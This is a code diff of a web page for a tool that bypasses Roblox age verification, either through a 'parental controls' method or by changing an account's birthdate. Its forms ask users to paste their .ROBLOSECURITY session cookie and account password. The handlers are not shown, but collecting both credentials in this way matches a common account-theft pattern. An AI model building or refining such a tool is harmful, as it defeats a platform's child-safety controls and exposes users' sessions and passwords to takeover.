@@ -89,41 +89,44 @@ export default function Page() {
                   : 'text-slate-400 hover:text-slate-300'
               }`}
             >
-              Bypass
+              Method 1: Parental Controls
             </button>
             <button
               onClick={() => setActiveTab('birthdate')}
               className={`px-4 py-2 font-semibold transition-all ${
                 activeTab === 'birthdate'
-                  ? 'text-blue-400 border-b-2 border-blue-400'
+                  ? 'text-green-400 border-b-2 border-green-400'
                   : 'text-slate-400 hover:text-slate-300'
               }`}
             >
-              Change Birthdate
+              Method 2: Manual Birthdate
             </button>
           </div>
 
-          {/* Bypass Tab */}
+          {/* Method 1: Parental Controls Bypass */}
           {activeTab === 'bypass' && (
             <form onSubmit={handleBypass} className="space-y-4">
+              <p className="text-sm text-slate-400 mb-4">
+                Bypass age verification through parental controls. Requires your account cookie.
+              </p>
               <div>
-                <label className="block text-sm font-semibold mb-2">Roblox Cookie</label>
+                <label className="block text-sm font-semibold mb-2">Roblox Cookie (.ROBLOSECURITY)</label>
                 <input
                   type="password"
                   value={cookie}
                   onChange={(e) => setCookie(e.target.value)}
-                  placeholder=".ROBLOSECURITY cookie"
+                  placeholder="Paste your .ROBLOSECURITY cookie"
                   className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white placeholder-slate-500"
                   required
                 />
               </div>
               <div>
-                <label className="block text-sm font-semibold mb-2">Password</label>
+                <label className="block text-sm font-semibold mb-2">Account Password</label>
                 <input
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  placeholder="Account password"
+                  placeholder="Your Roblox password"
                   className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white placeholder-slate-500"
                   required
                 />
@@ -133,21 +136,24 @@ export default function Page() {
                 disabled={loading}
                 className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-600 text-white font-bold py-2 rounded-lg transition-colors"
               >
-                {loading ? 'Processing...' : 'Execute Bypass'}
+                {loading ? 'Processing...' : 'Bypass via Parental Controls'}
               </button>
             </form>
           )}
 
-          {/* Birthdate Tab */}
+          {/* Method 2: Manual Birthdate Change */}
           {activeTab === 'birthdate' && (
             <form onSubmit={handleSetBirthdate} className="space-y-4">
+              <p className="text-sm text-slate-400 mb-4">
+                Directly change your account birthdate. No verification needed.
+              </p>
               <div>
-                <label className="block text-sm font-semibold mb-2">Roblox Cookie</label>
+                <label className="block text-sm font-semibold mb-2">Roblox Cookie (.ROBLOSECURITY)</label>
                 <input
                   type="password"
                   value={cookie}
                   onChange={(e) => setCookie(e.target.value)}
-                  placeholder=".ROBLOSECURITY cookie"
+                  placeholder="Paste your .ROBLOSECURITY cookie"
                   className="w-full px-4 py-2 bg-slate-700 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-400 text-white placeholder-slate-500"
                   required
                 />
@@ -168,7 +174,7 @@ export default function Page() {
                 disabled={loading}
                 className="w-full bg-green-600 hover:bg-green-700 disabled:bg-slate-600 text-white font-bold py-2 rounded-lg transition-colors"
               >
-                {loading ? 'Processing...' : 'Change Birthdate to 2016'}
+                {loading ? 'Processing...' : `Change Birthdate to ${year}`}
               </button>
             </form>
           )}
